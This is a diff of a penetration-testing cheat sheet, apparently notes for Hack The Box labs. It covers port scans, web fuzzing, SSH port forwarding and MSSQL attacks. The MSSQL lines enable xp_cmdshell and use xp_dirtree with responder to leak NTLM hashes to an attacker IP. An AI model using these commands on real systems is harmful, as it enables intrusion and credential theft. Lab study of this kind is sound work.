@@ -31,15 +31,14 @@ nmap -sU --top-ports 20 -oN scan.nmap -vv $ip  (UDP)
 (File fuzzing) ffuf -u http://localhost:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt    
 (HTTP GET)  ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx        
 (HTTP POST) ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d '<a data-footnote-ref href="#user-content-fn-1">id=FUZZ</a>' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx  
-
+(Use raw request) ffuf -u [URL] -request [request.txt] -w &#x3C;( seq 0 65535) -ac [FUZZ should be present in the request]
+-p "1.0" and -rate [25]  to rate limit incase of WAF
 wfuzz -c -w /usr/share/wordlists/yes.txt -u "http://alert.htb/" -H "Host: FUZZ.alert.htb"
 
 curl --insecure -b "[cookiename]=[value]" -X POST --data "[data]" [URL] (--insecure bypass SSL verification)
 
 nikto -h $ip
 </code></pre>
-
-{% embed url="https://cwiki.apache.org/confluence/display/httpd/DistrosDefaultLayout" %}
 
 ### FTP (21)
 
@@ -56,6 +55,8 @@ get [file]
 ### SSH (22)
 
 ```
+ssh -L [kali_port]:localhost:[target_port] [user]@[ip] -fN
+chmod 600 id_dsa
 port forwarding (local and remote)
 sshuttle
 proxychains?
@@ -161,7 +162,7 @@ enable_xp_cmdshell
 EXECUTE sp_configure 'show advanced options', 1;
 EXECUTE sp_configure 'xp_cmdshell', 1;
 RECONFIGURE;
-EXECUTE xp_cmdshell 'whoami'
+EXECUTE xp_cmdshell 'whoami';
 
 sudo responder -I tun0
 EXEC master.sys.xp_dirtree '\\10.10.14.9\myshare',1, 1
